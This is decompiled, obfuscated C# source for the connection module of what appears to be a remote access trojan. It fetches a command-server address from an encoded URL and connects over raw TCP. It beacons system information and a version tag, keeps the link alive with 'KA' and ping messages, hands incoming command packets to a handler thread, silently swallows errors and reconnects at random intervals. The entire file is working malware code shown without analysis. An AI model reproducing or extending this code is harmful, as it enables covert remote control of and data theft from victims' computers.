using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns1;
using ns2;
using ns4;
using ns6;
using ns8;

namespace ns7;

public class GClass6
{
	public static string string_0 = GClass3.string_3;

	public static string string_1 = GClass3.string_4;

	public static TcpClient tcpClient_0;

	public static Random random_0 = new Random();

	public static Thread thread_0 = new Thread(smethod_0);

	public static bool bool_0 = false;

	public static MemoryStream memoryStream_0 = null;

	public static Timer timer_0 = null;

	public static int int_0 = 0;

	public static List<int> list_0 = new List<int>();

	public static bool bool_1 = false;

	public static bool bool_2 = false;

	public static int int_1 = 0;

	public static int int_2 = 0;

	public static void smethod_0()
	{
		checked
		{
			while (true)
			{
				try
				{
					Thread.Sleep(1);
					int_0++;
					if (int_0 != 200)
					{
						goto IL_0055;
					}
					int_0 = 0;
					if ((!tcpClient_0.Client.Poll(-1, SelectMode.SelectRead) || tcpClient_0.Available != 0) && tcpClient_0.Connected)
					{
						goto IL_0055;
					}
					goto end_IL_0001;
					IL_0055:
					if (tcpClient_0.Available <= 0)
					{
						continue;
					}
					byte[] array = new byte[tcpClient_0.Available - 1 + 1];
					tcpClient_0.Client.Receive(array, 0, array.Length, SocketFlags.None);
					memoryStream_0.Write(array, 0, array.Length);
					while (Class0.smethod_1(memoryStream_0.ToArray()).Contains(string_0))
					{
						Array array2 = Class0.smethod_5(memoryStream_0.ToArray(), string_0);
						new Thread(delegate(object a0)
						{
							GClass5.smethod_0((byte[])a0);
						}).Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array2, new object[1] { 0 }, (string[])null)));
						memoryStream_0.Dispose();
						memoryStream_0 = new MemoryStream();
						if (array2.Length == 2)
						{
							memoryStream_0.Write((byte[])NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), (Type)null, "length", new object[0], (string[])null, (Type[])null, (bool[])null)));
							continue;
						}
						break;
					}
					continue;
					end_IL_0001:;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				break;
			}
			bool_0 = false;
			while (!bool_0)
			{
				Thread.Sleep(random_0.Next(5000));
				smethod_1();
			}
			smethod_0();
		}
	}

	public static object smethod_1()
	{
		bool_0 = false;
		try
		{
			tcpClient_0.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			timer_0.Dispose();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			memoryStream_0.Dispose();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			tcpClient_0 = new TcpClient();
			tcpClient_0.ReceiveBufferSize = 5120000;
			tcpClient_0.SendBufferSize = 5120000;
			tcpClient_0.ReceiveTimeout = -1;
			tcpClient_0.SendTimeout = -1;
			using (WebClient webClient = new WebClient())
			{
				try
				{
					NetworkCredential networkCredential = (NetworkCredential)(webClient.Credentials = new NetworkCredential("", ""));
					string[] array = Strings.Split(Conversions.ToString(NewLateBinding.LateGet((object)webClient, (Type)null, "DownloadString", new object[1] { GClass7.smethod_1(GClass3.string_0) }, (string[])null, (Type[])null, (bool[])null)), ":", -1, (CompareMethod)0);
					GClass3.string_1 = array[0];
					new Random();
					GClass3.int_0 = Conversions.ToInteger(array[new Random().Next(1, array.Length)]);
					webClient.Dispose();
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
			tcpClient_0.Connect(GClass3.string_1, GClass3.int_0);
			bool_0 = true;
			memoryStream_0 = new MemoryStream();
			smethod_3(string.Concat("info", string_1, GClass1.smethod_5(), string_1, GClass1.smethod_1(), string_1, "v0.1.9.2", string_1, GClass1.smethod_2(), " ", GClass1.smethod_3(), string_1, GClass1.smethod_4(), string_1, GClass1.smethod_10(), string_1, GClass1.smethod_8(), string_1, GClass1.smethod_12(), string_1, GClass1.smethod_9(), string_1, GClass3.int_0, string_1, GClass1.smethod_15(), string_1, "...", string_1, " ", string_1, GClass1.smethod_11().ToString(), string_1, GClass3.object_0));
			TimerCallback callback = delegate
			{
				smethod_4();
			};
			timer_0 = new Timer(callback, null, 0, 1);
			return bool_0;
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			object result = bool_0;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void smethod_2(byte[] byte_0)
	{
		MemoryStream memoryStream = new MemoryStream();
		try
		{
			memoryStream.Write(byte_0, 0, byte_0.Length);
			memoryStream.Write(Class0.smethod_0(string_0), 0, string_0.Length);
			lock (tcpClient_0)
			{
				tcpClient_0.Client.Poll(-1, SelectMode.SelectWrite);
				tcpClient_0.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
			}
			memoryStream.Dispose();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool_0 = false;
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_3(string string_2)
	{
		smethod_2(Class0.smethod_0(Conversions.ToString(GClass7.smethod_0(string_2))));
	}

	public static void smethod_4()
	{
		checked
		{
			try
			{
				if (bool_2)
				{
					int_1++;
				}
				if (bool_1)
				{
					bool_2 = false;
					bool_1 = false;
					smethod_3("!P" + string_1 + int_1);
					int_1 = 0;
				}
				int_2++;
				if (int_2 > 5000)
				{
					int_2 = 0;
					smethod_3("KA");
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
